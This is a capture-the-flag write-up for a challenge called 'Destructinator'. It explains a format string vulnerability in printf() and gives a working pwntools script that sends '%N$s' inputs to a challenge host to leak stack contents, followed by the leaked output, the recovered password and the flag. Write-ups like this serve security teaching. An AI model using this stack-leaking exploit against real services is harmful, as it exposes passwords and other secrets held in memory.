# Destructinator

Author: [roerohan](https://github.com/roerohan)

## Exploit

In this challenge, there is a format string vulnerability, since the `printf()` function directly accepts user input. The user can enter strings like `%s`, `%x`, `%p`, to leak items from the stack.

The password was stored as a local variable in the function, therefore it must be present on the stack. We run the following script to leak the stack.

```py
from pwn import *
host = 'overly.uniquename.xyz'
port = 8880

stack = []

for i in range(1, 100):
    try:
        p = remote(host, port)
        print(p.recv(1024))
        p.sendline('%{}$s'.format(i))
        print(p.recvline())
        y = p.recvline()

        stack.append(y)
        print(y)
        print(stack)
    except:
        pass
```

This gives an output like the following

```py
[b'(null)\n', b'\xd6.y\xe4\xfd\x7f\n', b'(null)\n', b'I\x89\xc0H\x85\xc0\x0f\x84\xc2\n', b'%11$s\n', b'1_l0v3_c4ts\n', b'H\x8d\x05\x88\xf4\x02\n', b'(null)\n', b'I\x83\xc5\x02A\x0f\xb7m\xfeI\x89\xc6L\x8dx\xfeM\x85\xe4u\x13\xeb\xcc\x0f\x1f@\n', b'(null)\n', b'\n', b'(null)\n', b'1_l0v3_c4ts\n', b'\n', b'\x85\xc0y\xe5H\xc7\xc0\xc0\xff\xff\xffH\x8bs\x08H\x8d\rb\xcf\x02\n'...]
```

We can see the string `1_l0v3_c4ts` in the array above, which is actually the password for the challenge. Entering this returns the flag:

```
dsc{7h3_p20ff3502_7h4nk5_y0u}
```